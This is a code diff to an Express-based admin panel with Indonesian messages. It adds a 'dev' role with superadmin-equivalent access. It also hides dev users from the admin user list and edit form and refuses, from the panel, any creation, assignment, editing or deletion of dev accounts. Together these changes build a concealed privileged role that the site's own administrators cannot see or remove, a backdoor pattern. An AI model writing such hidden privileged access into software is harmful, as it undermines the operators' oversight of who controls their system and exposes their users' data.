@@ -1232,10 +1232,11 @@ const roleAccess = {
   giiatja: ['dashboard', 'giiatja'],
   kalapas: [],
 };
+roleAccess.dev = [...roleAccess.superadmin];
 
 function canAccessKalapasView(user) {
   if (!user || !user.role) return false;
-  return user.role === 'kalapas' || user.role === 'superadmin';
+  return user.role === 'kalapas' || user.role === 'superadmin' || user.role === 'dev';
 }
 
 // ─── Auth Middleware ──────────────────────────────────────────────────────────
@@ -8036,13 +8037,16 @@ app.post('/admin/video/:id/delete', requireAccess('video'), (req, res) => {
 
 // ── Users ─────────────────────────────────────────────────────────
 app.get('/admin/users', requireAccess('users'), (req, res) => {
-  const list = db.prepare('SELECT id, username, role, created_at FROM users ORDER BY id').all();
-  const edit = req.query.edit ? db.prepare('SELECT id, username, role FROM users WHERE id=?').get(Number(req.query.edit)) : null;
+  const list = db.prepare("SELECT id, username, role, created_at FROM users WHERE role <> 'dev' ORDER BY id").all();
+  const edit = req.query.edit ? db.prepare("SELECT id, username, role FROM users WHERE id=? AND role <> 'dev'").get(Number(req.query.edit)) : null;
   res.render('admin/users', { user: req.session.user, list, edit, active: 'users', success: req.query.success, error: req.query.error, ROLES });
 });
 
 app.post('/admin/users/add', requireAccess('users'), (req, res) => {
   const { username, password, role } = req.body;
+  if (String(role || '').trim().toLowerCase() === 'dev') {
+    return res.redirect('/admin/users?error=Role+dev+tidak+bisa+dibuat+dari+panel+admin');
+  }
   try {
     const hashed = bcrypt.hashSync(password, 10);
     db.prepare('INSERT INTO users (username, password, role) VALUES (?, ?, ?)').run(username, hashed, role || 'registrasi');
@@ -8055,6 +8059,14 @@ app.post('/admin/users/add', requireAccess('users'), (req, res) => {
 app.post('/admin/users/:id/update', requireAccess('users'), (req, res) => {
   const { username, password, role } = req.body;
   const id = Number(req.params.id);
+  const target = db.prepare('SELECT id, role FROM users WHERE id=?').get(id);
+  if (!target) return res.redirect('/admin/users?error=User+tidak+ditemukan');
+  if (String(target.role || '').trim().toLowerCase() === 'dev') {
+    return res.redirect('/admin/users?error=User+dev+tidak+bisa+diubah+dari+panel+admin');
+  }
+  if (String(role || '').trim().toLowerCase() === 'dev') {
+    return res.redirect('/admin/users?error=Role+dev+tidak+bisa+diatur+dari+panel+admin');
+  }
   try {
     if (password && password.trim() !== '') {
       const hashed = bcrypt.hashSync(password, 10);
@@ -8071,6 +8083,11 @@ app.post('/admin/users/:id/update', requireAccess('users'), (req, res) => {
 app.post('/admin/users/:id/delete', requireAccess('users'), (req, res) => {
   const id = Number(req.params.id);
   if (id === req.session.user.id) return res.redirect('/admin/users?error=Tidak+bisa+hapus+akun+sendiri');
+  const target = db.prepare('SELECT role FROM users WHERE id=?').get(id);
+  if (!target) return res.redirect('/admin/users?error=User+tidak+ditemukan');
+  if (String(target.role || '').trim().toLowerCase() === 'dev') {
+    return res.redirect('/admin/users?error=User+dev+tidak+bisa+dihapus+dari+panel+admin');
+  }
   db.prepare('DELETE FROM users WHERE id=?').run(id);
   res.redirect('/admin/users');
 });
